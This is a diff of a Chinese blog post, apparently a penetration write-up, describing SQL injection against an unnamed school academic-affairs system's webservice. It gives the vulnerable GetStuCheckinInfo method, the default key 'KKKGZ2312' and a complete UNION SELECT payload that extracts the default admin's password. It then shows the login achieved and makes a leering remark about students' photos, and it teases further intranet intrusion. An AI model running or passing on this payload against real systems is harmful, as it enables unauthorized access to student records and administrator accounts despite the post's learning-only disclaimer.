@@ -6,15 +6,42 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://y00z.github.io">
-  <title>标签 | Yooz的博客</title>
+  <title>某教务系统注入getshell提权一条龙(上) | Yooz的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="标签">
-<meta property="og:url" content="http://y00z.github.io/tags/index.html">
+  <meta name="description" content="前言
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！
+
+
+正文
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;这篇文章是我在去年的时候在土司和90上写的一篇文章，当时也将漏洞详细上报给乌云了。今时不同往日，如今乌云关了，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="某教务系统注入getshell提权一条龙(上)">
+<meta property="og:url" content="http://y00z.github.io/2017/03/14/某教务系统注入getshell提权一条龙-上/index.html">
 <meta property="og:site_name" content="Yooz的博客">
-<meta property="og:updated_time" content="2016-12-14T02:11:41.380Z">
+<meta property="og:description" content="前言
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！
+
+
+正文
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;这篇文章是我在去年的时候在土司和90上写的一篇文章，当时也将漏洞详细上报给乌云了。今时不同往日，如今乌云关了，">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-45.png">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-46.png">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-47.png">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-48.png">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-49.png">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-50.png">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-51.png">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-52.png">
+<meta property="og:updated_time" content="2017-03-14T06:26:49.480Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="标签">
+<meta name="twitter:title" content="某教务系统注入getshell提权一条龙(上)">
+<meta name="twitter:description" content="前言
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！
+
+
+正文
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;这篇文章是我在去年的时候在土司和90上写的一篇文章，当时也将漏洞详细上报给乌云了。今时不同往日，如今乌云关了，">
+<meta name="twitter:image" content="http://y00z.github.io/images/pasted-45.png">
   
     <link rel="alternative" href="/atom.xml" title="Yooz的博客" type="application/atom+xml">
   
@@ -144,27 +171,81 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="page-undefined" class="article article-type-page " itemscope itemprop="blogPost">
+            <article id="post-某教务系统注入getshell提权一条龙-上" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      标签
+      某教务系统注入getshell提权一条龙(上)
     </h1>
   
 
         
-        <a href="/tags/index.html" class="archive-article-date">
-  	<time datetime="2016-12-14T02:05:06.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-14</time>
+        <a href="/2017/03/14/某教务系统注入getshell提权一条龙-上/" class="archive-article-date">
+  	<time datetime="2017-03-14T03:14:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-03-14</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote>
+<font color="#ff0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>
+
+</blockquote>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><blockquote>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这篇文章是我在去年的时候在土司和90上写的一篇文章，当时也将漏洞详细上报给乌云了。今时不同往日，如今乌云关了，<a id="more"></a>土司也太久没登成了僵尸号。于是把文章搬过来，凑下文章篇数。</p>
+</blockquote>
+<h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><blockquote>
+<p>今天的目标</p>
+</blockquote>
+<p><img src="/images/pasted-45.png" alt=""></p>
+<blockquote>
+<p>找到webservice接口，路径在service.asmx</p>
+</blockquote>
+<p><img src="/images/pasted-46.png" alt=""></p>
+<blockquote>
+<p>漏洞在于</p>
+<ul>
+<li>GetStuCheckinInfo<br>这个接口</li>
+</ul>
+</blockquote>
+<p><img src="/images/pasted-47.png" alt=""></p>
+<blockquote>
+<p>我们只需要关注<code>xh</code>和 <code>strKey</code> 这两个节点就可以了。</p>
+<p>其中的strKey都是默认的<code>KKKGZ2312</code></p>
+<p><code>Xh</code>这个节点就是我们的注入语句了。</p>
+</blockquote>
+<p>poc:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">222222' union <span class="keyword">select</span> </div><div class="line"><span class="literal">Null</span>,kl,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span></div><div class="line">,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span> <span class="keyword">from</span> yhb <span class="keyword">where</span> yhm=<span class="string">'jwc01</span></div></pre></td></tr></table></figure></p>
+<blockquote>
+<p>yhb   用户表<br>yhm   用户名<br>kl    口令</p>
+<p>表示查询的是yhm表中jwc01的kl记录。(该教务系统默认管理员是jwc01)</p>
+<p>构造好语句开始注入</p>
+</blockquote>
+<p><img src="/images/pasted-48.png" alt=""></p>
+<blockquote>
+<p>可以看到jwc01用户的密码密文出来了。</p>
+<p>我们拿去解密</p>
+</blockquote>
+<p><img src="/images/pasted-49.png" alt=""></p>
+<blockquote>
+<p>Ok可以登录了</p>
+</blockquote>
+<p><img src="/images/pasted-50.png" alt=""></p>
+<blockquote>
+<p>Bingo</p>
+</blockquote>
+<p><img src="/images/pasted-51.png" alt=""></p>
+<blockquote>
+<p>美女多多，</p>
+</blockquote>
+<p><img src="/images/pasted-52.png" alt=""></p>
+<h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><blockquote>
+<p>不想让文章太长，getshell提权部分就放在下篇。<br>后期还会写更多的渗透文章，漫游学校内网，更改led大屏幕，免费上网等。<br>再次提醒：<br><strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></p>
+</blockquote>
+
       
 
       
@@ -203,6 +284,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全攻防</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -253,7 +345,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://y00z.github.io/tags/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://y00z.github.io/2017/03/14/某教务系统注入getshell提权一条龙-上/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -265,6 +357,25 @@
 </article>
 
   
+<nav id="article-nav">
+  
+    <a href="/2017/03/14/某教务系统注入getshell提权一条龙-下/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          某教务系统注入getshell提权一条龙(下)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/03/07/s2-045任意命令执行exp/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">s2-045任意命令执行exp</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 
 
@@ -297,7 +408,7 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
